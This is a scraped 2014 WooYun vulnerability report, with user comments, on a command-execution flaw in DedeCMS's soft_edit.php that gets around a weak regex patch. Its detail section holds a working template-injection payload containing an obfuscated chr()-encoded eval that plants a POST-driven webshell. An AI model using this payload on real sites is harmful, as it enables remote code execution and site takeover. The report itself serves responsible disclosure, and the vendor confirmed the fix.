{"id": 3842, "wybug_id": "wooyun-2014-052792", "wybug_title": "Dedecms某命令执行漏洞（续）", "wybug_corp": "Dedecms", "wybug_author": "kobin97", "wybug_date": "2014-03-04 21:57", "wybug_open_date": "2014-06-02 21:57", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向公众公开  简要描述： 很好，今天出的补丁修复了前面的漏洞了。但看了下20140228的补丁。。你们是欺负我不懂正则么？ 详细说明：  先看： WooYun: Dedecms某命令执行漏洞 20140228的补丁对soft_edit.php增加了\nif(!preg_match(\"#[_=&///?\\.a-zA-Z0-9-]+$#i\", $softurl))\t\t\t{\t\t\t\tShowMsg(\"确定软件地址提交正确!\", \"-1\");\t\t\t\texit;\t\t\t}\n想问一下，这是神马正则？任何一个字符都能让其匹配呀。。。测试：添加上传软件本地地址 http://www.hao123.com其它乱填就行，添加成功后，再次进入修改界面软件地址改为：http://www.hao123.com}x{/dede:link}{dede:a text'=x']=0;eval(chr(101).chr(118).chr(97).chr(108).chr(40).chr(34).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(99).chr(93).chr(59).chr(34).chr(41).chr(59));// }xxxx{/dede:a}{dede:link}xxx注意，这里后面多了 xxx ，就是为了绕过这个正则补丁。然后执行完全没有压力！后来测试，在GPC OFF跟 ON下写入的地址有所区别，上面是在ON下写入的。原因你们懂得。在 filter.inc.php 中，你们不管 GPC ，全过滤了 addslashes。而且对这样的$svar[$_k]直接返回错误的值了，这个BUG你们看着办吧。\nfunction _FilterAll($fk, &$svar){    global $cfg_notallowstr,$cfg_replacestr;    if( is_array($svar) )    {        foreach($svar as $_k => $_v)        {            $svar[$_k] = _FilterAll($fk,$_v);        }    }    else    {        if($cfg_notallowstr!='' && preg_match(\"#\".$cfg_notallowstr.\"#i\", $svar))        {            ShowMsg(\" $fk has not allow words!\",'-1');            exit();        }        if($cfg_replacestr!='')        {            $svar = preg_replace('/'.$cfg_replacestr.'/i', \"***\", $svar);        }    }    return addslashes($svar);}/* 对_GET,_POST,_COOKIE进行过滤 */foreach(Array('_GET','_POST','_COOKIE') as $_request){    foreach($$_request as $_k => $_v)    {        ${$_k} = _FilterAll($_k,$_v);    }}\n   漏洞证明：  \n\n   修复方案：  我也不懂！   版权声明：转载请注明来源 kobin97@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-03-05 10:14 厂商回复： 已经修复，感谢您的反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-04 21:57 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  顶楼卖摔炮    \n     2014-03-04 22:04 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  二楼卖手榴弹    \n     2014-03-04 22:05 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  织梦到底惹着谁了。你们这么对待人家，就不怕招报应吗？    \n     2014-03-04 22:09 |    \t\t苏泽 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:19        | 大习科。)\t\t \n  哇塞    好像很厉害的样子。    \n     2014-03-04 22:10 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  继续续！牛逼啊    \n     2014-03-04 22:19 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  你们是欺负我不懂正则吗？    \n     2014-03-04 22:24 |    \t\t忆苦思甜 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:25        )\t\t \n  你关注的白帽子 kobin97 发表了漏洞 Dedecms某命令执行漏洞（续）    \n     2014-03-04 22:33 |    \t\t马燕羊蝎子 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:10        | 亲，啥时候请吃马燕羊蝎子。)\t\t \n  — —。 奶粉钱到手啊    \n     2014-03-04 22:50 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  dede没倒, 乌云先破产了    \n     2014-03-04 22:52 |    \t\td3pT1 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 人法地，地法天，天法道，道法自然。)\t\t \n  你这么屌- -dede知道吗？    \n     2014-03-04 22:53 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  dede没倒, 乌云先破产了     \n     2014-03-04 23:00 |    \t\tLet a person cry. \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:9        | xxoo)\t\t \n  吊炸天了，dede赶紧礼物吧    \n     2014-03-04 23:15 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @My5t3ry  哈哈 感觉还真是    \n     2014-03-05 09:27 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  膜拜大神    \n     2014-03-05 11:05 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  马克    \n     2014-03-05 12:02 |    \t\tt00000by57 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:5        | Access Denied.)\t\t \n  目测跟10年的老洞子有关系http://hi.baidu.com/toby57/item/20b05808c14fefdd72e6763b    \n     2014-03-08 19:53 |    \t\t东方的肚皮舞 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 社区变了。)\t\t \n  出个getshell啊 大牛    \n     2014-03-10 02:58 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n  树大招风吗？    \n     2014-06-02 23:53 |    \t\t小森森 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 不中二 枉少年)\t\t \n  赞    \n     2014-06-03 22:25 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  乌云最火的几个厂商:dede,dz,gov,edu    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}